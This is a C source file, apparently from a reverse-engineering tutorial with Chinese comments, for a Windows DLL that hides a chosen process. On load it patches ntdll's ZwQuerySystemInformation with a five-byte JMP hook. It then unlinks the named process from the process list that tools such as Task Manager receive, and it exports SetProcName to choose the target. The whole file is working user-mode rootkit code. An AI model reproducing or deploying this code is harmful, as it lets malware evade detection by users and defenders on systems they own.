#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS                        (0x00000000L)

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)
        (SYSTEM_INFORMATION_CLASS SystemInformationClass,
         PVOID SystemInformation,
         ULONG SystemInformationLength,
         PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")

#pragma comment(linker, "/SECTION:.SHARE,RWS")//全局变量（在共享内存中）
#pragma data_seg(".SHARE")      //创建名为.share的共享节区
TCHAR g_szProcName[MAX_PATH] = {0,};//创建名为g_szProcName的缓冲区
#pragma data_seg()

// global variable
BYTE g_pOrgBytes[5] = {0,};


//此函数用来将api前5个字节改为jmpxxxx
//szDllName：dll名称，szFuncName：api名称，pfnNew：勾取函数地址，pOrgBytes：存储原来5个字节的缓冲区
BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes) {
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = {0xE9, 0,};
    PBYTE pByte;

    pfnOrg = (FARPROC) GetProcAddress(GetModuleHandleA(szDllName), szFuncName);//获取需要勾取的API地址
    pByte = (PBYTE) pfnOrg;
    if (pByte[0] == 0xE9)//若已被勾取，则返回False
        return FALSE;
    VirtualProtect((LPVOID) pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);//为了修改5字节，先向内存添加“写”的属性
    memcpy(pOrgBytes, pfnOrg, 5);//备份原有代码
    dwAddress = (DWORD) pfnNew - (DWORD) pfnOrg - 5;//计算JMP地址   => XXXX = pfnNew - pfnOrg - 5
    memcpy(&pBuf[1], &dwAddress, 4);//E9，剩下后面4个字节为跳转的地址
    memcpy(pfnOrg, pBuf, 5);//“钩子”：修改5个字节
    VirtualProtect((LPVOID) pfnOrg, 5, dwOldProtect, &dwOldProtect);//恢复内存属性
    return TRUE;
}


BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes) {
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;
    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);//获取API地址
    pByte = (PBYTE) pFunc;
    if (pByte[0] != 0xE9)//若已脱钩，则返回False
        return FALSE;
    VirtualProtect((LPVOID) pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);//向内存添加“写”的属性，为恢复原代码做准备
    memcpy(pFunc, pOrgBytes, 5);//脱钩
    VirtualProtect((LPVOID) pFunc, 5, dwOldProtect, &dwOldProtect);//恢复内存属性
    return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(//勾取过程
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength) {
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
    char szProcName[MAX_PATH] = {0,};
    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);//开始前先“脱钩”
    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),
                           DEF_ZWQUERYSYSTEMINFORMATION);//调用原始API
    status = ((PFZWQUERYSYSTEMINFORMATION) pFunc)
            (SystemInformationClass, SystemInformation,
             SystemInformationLength, ReturnLength);

    if (status != STATUS_SUCCESS)
        goto __NTQUERYSYSTEMINFORMATION_END;

    //针对SystemProcessInformation类型操作
    if (SystemInformationClass == SystemProcessInformation) {
        // SYSTEM_PROCESS_INFORMATION类型转换
        // pCur是单向链表的头
        pCur = (PSYSTEM_PROCESS_INFORMATION) SystemInformation;

        while (TRUE) {
            // 比较进程名称，g_szProcName为要隐藏的进程的名称
            // (在SetProcName()设置)
            if (pCur->Reserved2[1] != NULL) {
                if (!_tcsicmp((PWSTR) pCur->Reserved2[1], g_szProcName)) {
                    if (pCur->NextEntryOffset == 0)//从链表中删除隐藏进程的节点
                        pPrev->NextEntryOffset = 0;
                    else
                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
                } else
                    pPrev = pCur;
            }
            if (pCur->NextEntryOffset == 0)
                break;
            pCur = (PSYSTEM_PROCESS_INFORMATION)
                    ((ULONG) pCur + pCur->NextEntryOffset);//链表的下一项
        }
    }

    __NTQUERYSYSTEMINFORMATION_END:
    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
                 (PROC) NewZwQuerySystemInformation, g_pOrgBytes);//函数终止前，再次执行API勾取操作，为下次调用准备
    return status;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    char szCurProc[MAX_PATH] = {0,};
    char *p = NULL;
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if ((p != NULL) && !_stricmp(p + 1, "HideProc.exe"))//若为HideProc.exe则不进行勾取
        return TRUE;//进行异常处理
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH : //dll加载时候，API勾取
            hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
                         (PROC) NewZwQuerySystemInformation, g_pOrgBytes);
            break;
        case DLL_PROCESS_DETACH : //dll卸载时候，API脱钩
            unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
                           g_pOrgBytes);
            break;
    }
    return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void SetProcName(LPCTSTR szProcName)//将要隐藏的进程名称保存到g_szProcName中
{
    _tcscpy_s(g_szProcName, szProcName);
}
#ifdef __cplusplus
}
#endif
